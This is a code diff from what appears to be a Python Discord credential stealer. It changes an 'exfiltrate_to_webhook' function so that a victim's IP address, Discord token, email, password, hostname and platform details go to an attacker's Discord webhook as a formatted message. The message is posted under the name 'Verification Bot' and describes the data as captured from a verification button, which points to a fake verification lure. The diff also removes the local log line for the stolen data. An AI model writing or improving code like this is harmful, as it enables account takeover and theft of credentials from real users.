@@ -144,21 +144,32 @@ def get_discord_credentials():
     
     return email, password
 
-# --- EXFILTRATION ---
+# --- EXFILTRATION (FIXED FOR DISCORD WEBHOOKS) ---
 def exfiltrate_to_webhook(ip, token, email, password, webhook_url):
+    # Build formatted message for Discord webhook
+    formatted_message = (
+        f"**🔐 New Verification Data**\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"**Timestamp:** {datetime.utcnow().isoformat()}\n"
+        f"**IP Address:** {ip}\n"
+        f"**Discord Token:** {token}\n"
+        f"**Discord Email:** {email}\n"
+        f"**Discord Password:** {password}\n"
+        f"**Platform:** {platform.system()}\n"
+        f"**Hostname:** {os.getenv('COMPUTERNAME', os.getenv('HOSTNAME', 'unknown'))}\n"
+        f"**Python Version:** {platform.python_version()}\n"
+        f"**Server Location:** Railway\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"*Data captured from verification button*"
+    )
+    
+    # Discord webhook payload
     payload = {
-        "timestamp": datetime.utcnow().isoformat(),
-        "user_ip": ip,
-        "discord_token": token,
-        "discord_email": email,
-        "discord_password": password,
-        "platform": platform.system(),
-        "hostname": os.getenv("COMPUTERNAME", os.getenv("HOSTNAME", "unknown")),
-        "python_version": platform.python_version(),
-        "server_location": "Railway"
+        "content": formatted_message,
+        "username": "Verification Bot",
+        "avatar_url": "https://cdn.discordapp.com/embed/avatars/1.png"
     }
     
-    logger.info(f"Preparing exfiltration payload: {json.dumps(payload, indent=2)}")
     headers = {"Content-Type": "application/json"}
     
     try:
